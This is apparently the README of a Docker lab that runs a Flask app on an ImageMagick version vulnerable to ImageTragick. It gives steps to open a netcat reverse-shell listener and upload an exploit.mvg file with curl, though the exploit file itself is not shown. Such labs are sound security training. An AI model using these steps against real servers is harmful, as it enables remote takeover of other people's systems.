# docker-imagetragick

Run a containerised Flask app that relies on a version of ImageMagic that is vulnerable to the ImageTragick bug.

## Steps

1. Build docker image:
```
$ docker build -t imagetragic .
```

2. Create docker container:
```
$ docker run -d --name imagetragic -p 127.0.0.1:8080:8080 imagetragic
```

3. Listen for reverse shell:
```
$ nc -l -n -vvv -p 4443
```

4. Edit the contents of `exploit.mvg` so that is uses the correct IP address that `nc` is listening on.

5. Upload exploit to vulnerable application:
```
$ curl -v -F file=@exploit.mvg http://127.0.0.1:8080
```

## Links

https://imagetragick.com/